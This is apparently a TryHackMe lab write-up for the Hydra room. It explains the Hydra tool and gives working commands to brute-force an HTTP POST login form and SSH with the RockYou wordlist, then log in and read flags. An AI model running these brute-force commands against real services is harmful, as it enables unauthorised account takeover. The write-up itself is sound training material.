# TryHackMe – Hydra
**Room:** Hydra   
**Category:** Password Attacks / Brute Force  
**Date:** 30 July 2026

---

# Overview

Hydra is one of the most widely used online password-cracking tools used during penetration testing.

Unlike offline password crackers such as **John the Ripper** or **Hashcat**, Hydra performs **live authentication attempts** against a running service.

It supports dozens of protocols including:

- HTTP
- HTTPS
- SSH
- FTP
- SMB
- RDP
- SMTP
- IMAP
- POP3
- MySQL
- PostgreSQL
- Telnet
- VNC

Hydra automates the process of trying usernames and passwords until valid credentials are found.

---

# What is Hydra?

Hydra is an **online login brute-force tool** developed by **THC (The Hacker's Choice)**.

Instead of cracking password hashes locally, Hydra communicates directly with the target service and repeatedly attempts authentication until valid credentials are found.

Workflow:

```text
Username
      │
      ▼
Password Wordlist
      │
      ▼
Hydra
      │
      ▼
Target Service
      │
      ▼
Valid Credentials Found
```

---

# Online vs Offline Password Cracking

| Online Cracking | Offline Cracking |
|-----------------|------------------|
| Targets a live service | Targets password hashes |
| Sends login requests | Computes hashes locally |
| Can trigger account lockouts | No interaction with target |
| Uses Hydra | Uses Hashcat / John the Ripper |

---

# Basic Hydra Syntax

```bash
hydra [options] target service
```

Example:

```bash
hydra -l molly -P rockyou.txt ssh://10.10.10.10
```

---

# Common Hydra Options

| Option | Description |
|---------|-------------|
| `-l` | Single username |
| `-L` | Username list |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-s` | Specify custom port |
| `-V` | Verbose output |
| `-t` | Number of parallel threads |

---

# HTTP POST Form Brute Force

The first task involved brute-forcing a web login page.

General syntax:

```bash
hydra -l <username> -P <wordlist> <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect"
```

---

# Understanding the HTTP POST Syntax

### http-post-form

Tells Hydra that the target is an HTTP POST login page.

---

### /login

The login endpoint.

Example:

```
http://10.x.x.x/login
```

---

### username=^USER^

Hydra replaces:

```
^USER^
```

with the supplied username.

---

### password=^PASS^

Hydra replaces:

```
^PASS^
```

with every password from the wordlist.

---

### F=Incorrect

Hydra checks for the word:

```
Incorrect
```

If this text appears, Hydra knows the login failed.

If the failure message disappears, Hydra reports valid credentials.

---

# Finding Login Parameters

Before running Hydra, I identified:

- Login URL
- Username parameter
- Password parameter
- Failure message

These can be obtained from:

- Browser Developer Tools (F12)
- HTML Source Code
- Burp Suite
- Room instructions

---

# Password Wordlists

The room used the **RockYou** password list.

Location in Kali Linux:

```bash
/usr/share/wordlists/rockyou.txt
```

If compressed:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

# Running Hydra Against the Web Login

Example:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt \
10.x.x.x http-post-form \
"/login:username=^USER^&password=^PASS^:F=Incorrect"
```

Hydra attempts each password until a valid one is found.

Example output:

```text
[80][http-post-form]

host: 10.x.x.x

login: molly

password: ********
```

---

# Logging into the Website

After Hydra discovered the credentials:

1. Open the login page.
2. Enter the username.
3. Enter the discovered password.
4. Log in.
5. Retrieve the first flag.

Hydra only finds credentials—it does **not** automatically retrieve flags.

---

# SSH Brute Force

The second task involved brute-forcing SSH.

Command:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.x.x.x
```

Hydra performs repeated SSH authentication attempts until the correct password is found.

Example output:

```text
[22][ssh]

host: 10.x.x.x

login: molly

password: ********
```

---

# Logging into SSH

Once the password was discovered:

```bash
ssh molly@10.x.x.x
```

After logging in:

```bash
ls
```

Output:

```text
flag2.txt
```

Display the flag:

```bash
cat flag2.txt
```

---

# Common Mistake I Made

Initially I typed:

```bash
hydra -l molly -P rockyou.txt <IP>
```

This produced:

```text
No such file or directory
```

### Why?

Linux interprets:

```text
<IP>
```

as **input redirection**, not as placeholder text.

Incorrect:

```bash
<IP>
```

Correct:

```bash
10.x.x.x
```

Always replace placeholders with the actual IP address.

---

# Hydra Placeholders

| Placeholder | Meaning |
|-------------|---------|
| `^USER^` | Username |
| `^PASS^` | Password |
| `F=` | Failure string |
| `S=` | Success string |

---

# Supported Protocols

Hydra supports more than 50 protocols including:

- SSH
- FTP
- HTTP
- HTTPS
- SMB
- RDP
- SMTP
- POP3
- IMAP
- Telnet
- VNC
- LDAP
- Cisco Authentication
- MySQL
- PostgreSQL

---

# Commands Used

```bash
# HTTP POST Login Brute Force
hydra -l molly -P /usr/share/wordlists/rockyou.txt \
10.x.x.x http-post-form \
"/login:username=^USER^&password=^PASS^:F=Incorrect"

# SSH Brute Force
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.x.x.x

# Login to SSH
ssh molly@10.x.x.x

# List files
ls

# Read flag
cat flag2.txt
```

---

# Workflow

```text
Identify Login Form
          │
          ▼
Find Parameters
          │
          ▼
Choose Wordlist
          │
          ▼
Run Hydra
          │
          ▼
Hydra Finds Password
          │
          ▼
Login to Website
          │
          ▼
Retrieve Flag 1
          │
          ▼
Run Hydra on SSH
          │
          ▼
SSH Login
          │
          ▼
Retrieve Flag 2
```

---

